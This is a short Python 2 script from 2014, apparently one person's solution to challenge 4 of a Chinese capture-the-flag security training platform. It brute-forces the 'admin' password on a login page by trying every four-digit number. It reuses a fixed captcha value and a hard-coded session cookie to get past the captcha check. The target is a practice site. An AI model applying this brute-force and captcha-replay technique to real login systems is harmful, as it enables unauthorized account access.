#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf_8 -*-
# Date: 2014/11/26
# Created by 独自等待
# 博客 http://www.waitalone.cn/
try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

try:
    print '\n网络信息安全攻防学习平台脚本关第4题\n'
    s = requests.Session()
    url = 'http://1.hacklist.sinaapp.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
    for pwd in xrange(1000, 10000):
        payload = {'username': 'admin', 'pwd': pwd, 'vcode': 'gkcj'}
        header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=2477842dec43ca1394e3c47867223295'}
        r = s.post(url, data=payload, headers=header)
        if 'error' not in r.content:
            print '\n爷,正确密码为:', pwd
            print '\n' + r.content
            break
        else:
            print '正在尝试密码:', pwd
except KeyboardInterrupt:
    raise SystemExit('大爷,按您的吩咐,已成功退出！')
